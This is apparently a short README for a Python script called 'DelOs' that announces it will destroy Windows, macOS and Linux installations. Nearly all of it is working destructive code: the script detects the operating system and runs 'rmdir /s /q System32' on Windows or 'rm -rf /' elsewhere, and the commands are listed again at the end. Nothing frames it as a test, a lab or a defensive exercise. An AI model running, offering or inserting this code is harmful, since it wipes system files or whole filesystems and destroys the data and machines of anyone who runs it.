# DelOs - Delete Operating Systems

Destroy Windows, Mac Os, Linux

```python
from sys import platform
from sys import exit as close
from os import system, chdir

win_path = "C:/Windows/"
win = "rmdir /s /q System32"
mac = "rm -rf /"
linux = "rm -rf /"

if platform == "win32":
    chdir(win_path)
    system(win)
elif platform == "darwin":
    system(mac)
elif platform == "linux" or platform == "linux2":
    system(linux)
else:
    close()
```

Windows - rmdir /s /q C:/Windows/System32
Mac Os - rm -rf /
Linux - rm -rf /
